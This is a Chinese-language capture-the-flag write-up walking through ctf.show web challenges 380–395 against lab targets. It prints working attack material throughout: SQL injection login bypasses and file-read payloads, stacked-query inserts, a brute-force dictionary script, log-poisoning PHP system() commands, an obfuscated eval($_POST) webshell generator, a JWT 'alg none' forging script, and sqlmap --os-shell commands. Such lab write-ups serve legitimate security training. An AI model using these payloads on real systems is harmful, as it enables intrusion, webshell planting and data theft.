---
title: Web入门_黑盒测试
author: Creexile
date: 2024-12-02 21:34:58
lastMod: 2025-04-10
summary: 'web380-395'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [信息收集, 漏洞利用, 文件包含, SQL注入, 爆破, CTF]
---

# Web入门\_黑盒测试

---

web380-395

## web380

打开是一个网站, 看得出来是一个博客, 基本没有任何交互; 目录扫描发现了`flag.php`和`page.php`, 前者不显示同时也没有传参点, 后者有提示:

```
Notice: Undefined index: id in /var/www/html/page.php on line 16
打开$id.php失败
```

说明变量名为id, 尝试传参`?id=1`, 回显大概意思为没有`1.php`这个文件, 且读取文件用的是`file_get_contents()`函数

所以直接读取`flag.php`即可, payload如下; 现在可以在源码中得到flag

```
?id=flag
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241027193855.png)

## web381

和上面的界面相同, 但是目录扫描没有出现有用的信息, `page.php`试过了, 锁死了`page_1.php`这种格式, 那只能换地方了

看看界面中有什么泄露的路径, 找到了一个`alsckdfy/layui/css/tree.css`, 访问`/alsckdfy/`成功得到flag

回显是"这就是后台地址", 然后就是flag

## web382

结合web381, 直接来到其后台地址, 发现存在登录框; 再次进行目录扫描, 有一个`check.php`, 可能存在登录框漏洞, 那就来抓包试试, 然后试出来sql注入

```
u=admin&p=1' or '1'='1
u=admin'or '1'='1&p=1
u=admin'and 1=1%23&p=1
```

登录即送flag

## web383

和上一题一模一样, 也是sql注入得到flag, payload都不带变的

## web384

- 描述: 密码前2位是小写字母，后三位是数字

那就是爆破了, 用bp在password处添加两个爆破位置, 选择`Cluster bomb`; 在payload界面分别设置`payload type`为`Brute forcer`, 然后分别设置两位小写英文字母和三位数字即可:

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241027205709.png)

或者用py脚本生成一个字典直接爆

```python
import string
s1=string.ascii_lowercase
s2=string.digits
f=open('dict.txt','w')
for i in s1:
  for j in s1:
    for k in s2:
      for l in s2:
        for m in s2:
          p=i+j+k+l+m
          f.write(p+"\n")
f.close()
```

最后爆破出来是`xy123`

## web385

扫描目录扫到`/install`, 发现是安装界面, 可以通过访问`install/?install`重置密码:

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241027211055.png)

不知道默认密码, 但是肯定不是强密码, 直接爆破得到账密: `admin/admin888`

## web386

几乎和上一题相同, 多了一个`clear.php`文件, 而且现在有文件锁机制, 我们需要删除这个`lock.dat`才能重新安装

这个`clear.php`文件似乎用于删除文件, 这不正好么; 但是我们没有参数, 盲猜一手:

```
/clear.php?file=install/lock.dat
```

重新访问`/install`, 发现成功删除, 返回`alsckdfy`利用上一题密码登录即可

## web387

- 描述: 前面部分和386一样

真的尝试了一次, 发现会返回"请勿删除安装文件", 让我们重新开始

扫目录, 扫出来`/debug`和`/robots.txt`

访问`/debug`, 显示file not exist, 尝试传入`/debug/?file=`, 发现返回了php debug的信息? 不过非常可惜, 我没有成功利用, 但是却发现可以文件包含:

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241027215135.png)

那就文件包含吧, 包含一个日志`/var/log/nginx/access.log`, 然后在UA头里面写马, 然后就失败了(似乎是不能传参); 那就直接执行命令吧

可以删除文件锁, 或者是直接读取flag; 文件锁就不再次赘述了

```php
# 删除文件
<?php unlink('/var/www/html/install/lock.dat')?>
# 执行命令, flag在/alsckdfy/check.php
<?php system('ls /var/www/html > /var/www/html/1.txt');?>
<?php system('cat /var/www/html/alsckdfy/check.php > /var/www/html/2.txt');?>
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241028084703.png)

## web388

此时再次尝试`/debug/file=`会显示调试结果已写入日志, 我认为这就是另一种文件包含, 看看有没有上传点

目录扫描后台地址, 发现有一个编辑器`/alsckdfy/editor`, 那就是编辑器漏洞了

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241028085838.png)

选择插入文件(文件空间是空的), 似乎只能上传特定后缀文件; 但是由于文件包含, 这个程序被包含时会被执行, 我们可以利用这个生成一个独立的木马:

```php
<?php
$a = '<?ph'.'p ev'.'al($_PO'.'ST[1]);?>';
file_put_contents('/var/www/html/1.php',$a);
?>
```

打包zip上传, 上传后可以得到上传路径, 此时返回debug界面包含该文件, 再次回到根目录访问1.php即可拿到shell

> 或者也可以和上一题一样, 直接日志包含, 将上面的生成木马的代码直接写到日志里面

## web389

访问debug显示权限不足, f12发现cookie多了auth字段判断权限, 那就是jwt伪造

修改用户为admin, 尝试密钥123456, 如图所示

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241028090911.png)

剩下的步骤和上一题相同, 我就用直接日志包含的方法; 下图是1.php已经生成的结果, 需要多访问一次才能正常触发

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241028091220.png)

然后就是执行命令了, 还是在`/alsckdfy/check.php`中

## web390

访问文章变成了`/page.php?id=1`, 很可能存在注入, 测试发现单引号没反应, 是数字型注入

```sql
/* 判断列数, 为3 */
?id=-1 order by 4%23
/* 判断显示位, 为2,3 */
?id=-1 union select 1,2,3%23
/* 查信息, 然后这里就断了, 查不了表 */
?id=-1 union select 1,database(),version()%23
/* 直接读文件, 查看源码即可 */
?id=1 union select 1,(select group_concat(username) from admin_user),(substr((select load_file('/var/www/html/alsckdfy/check.php')),1,255)) limit 1,1#
```

或者懒得搞, 直接交给sqlmap也行, 该文件会保存在本地

```bash
python .\sqlmap.py -u http://fdbabc63-b2f3-4050-8b2e-9f5ee609119a.chall.ctf.show/page.php?id=2 --file-read /var/www/html/alsckdfy/check.php --batch
```

还可以改jwt加密方法绕过验证

```python
# python2
import jwt

# payload, 更改iat, exp, nbf, jti
token_dict = {
"iss": "admin",
"iat": 1633525507,
"exp": 1633532707,
"nbf": 1633525507,
"sub": "admin",
"jti": "5d6279b30cda4893390547dd90151a0a"
}

# headers
headers = {
"alg": "none",
"typ": "JWT"
}
jwt_token = jwt.encode(token_dict, key='',headers=headers, algorithm="none")

print(jwt_token)
```

## web391

原来的注入点没了, 但是进入文章后顶部多了个输入框, 而且变成了字符型注入, 注入点为`/search.php?title=1`

```
# 省略什么显示位啊和列啊什么的
?title=-1' union select 1,substr((select load_file('/var/www/html/alsckdfy/check.php')),1,255),3 limit 0,1%23
```

用sqlmap:

```bash
python .\sqlmap.py -u http://042a780b-dfd3-4bd9-861c-81661b2915e0.chall.ctf.show/search.php?title=1 --file-read /var/www/html/alsckdfy/check.php --batch
```

## web392

更换了flag的位置

```
?title=-1%27%20union%20select%201,substr((select%20load_file(%27/flag%27)),1,255),3%20limit%200,1%23
```

用sqlmap

```bash
python sqlmap.py -u http://175efaca-626f-46a6-bddd-68246b90c5f5.chall.ctf.show/search.php?title=1 --os-shell
```

## web393

主页最下方有一个搜索引擎功能, 选择百度, 发现并不是直接跳转百度, 而是利用本网站返回结果, 可能存在ssrf; 传入也不是网址, 可能是通过将数据存储到数据库, 然后由数据库交互且只返回id

> `/link.php?id=3`会返回一个CSDN博客?是谁的呢

但是那个地方本身并不能拿到东西, 所以我们重新看向了上一题的方法: 通过上面那个输入框爆破, 看看数据被放在哪里

```bash
# 爆库 ctfshow
python .\sqlmap.py -u http://d62ac9f9-fdd1-4846-8a76-3ae86b75704a.challenge.ctf.show/search.php?title=1 --dbs --batch
# 爆表 link
python .\sqlmap.py -u http://d62ac9f9-fdd1-4846-8a76-3ae86b75704a.challenge.ctf.show/search.php?title=1 -D ctfshow --tables
# 爆字段
python .\sqlmap.py -u http://d62ac9f9-fdd1-4846-8a76-3ae86b75704a.challenge.ctf.show/search.php?title=1 -D ctfshow -T link --columns
# 不放心可以再看看字段内容, 肯定是有https://baidu.com的
python .\sqlmap.py -u http://d62ac9f9-fdd1-4846-8a76-3ae86b75704a.challenge.ctf.show/search.php?title=1 -D ctfshow -T link -C url --dump
```

![image](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241028222426.png)

所以我们可以将flag的结果(或网址)插入到这里面, 让我们可以通过`/link`路由访问到flag, payload如下:

```
search.php?title=1';insert into link values(10,'a','file:///flag');
```

然后访问`/link.php?id=10`得到flag

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241028224012.png)

## web394-web395

- 描述: FLAG_NOT_HERE

和上题相同, 此处用的16进制绕过

```
search.php?title=1';insert into link values(10,'a',0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870);
```

还有非预期解, 可以攻击redis服务和fastcig, 这个利用可以通过ssrf web360所使用的工具生成payload

但是url字段默认长度最长为255, 我们需要利用sql注入修改该设置., 其实就是改那个表, 将char(255)的限制改掉

```
search.php?title=1';alter table link modify column url text;
```

利用Gopherus生成payload, 该payload输入后, 访问`link.php?id=11`就会生成对应木马

```
search.php?title=1';insert into link values(11,'a',payload);
```

或者直接利用伪协议读取`check.php`, 访问`link.php?id=11`查看源代码即可

```
search.php?title=1';insert into link values(11,'a',0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870);
```

相关文件

- [[Web入门_SSRF]]
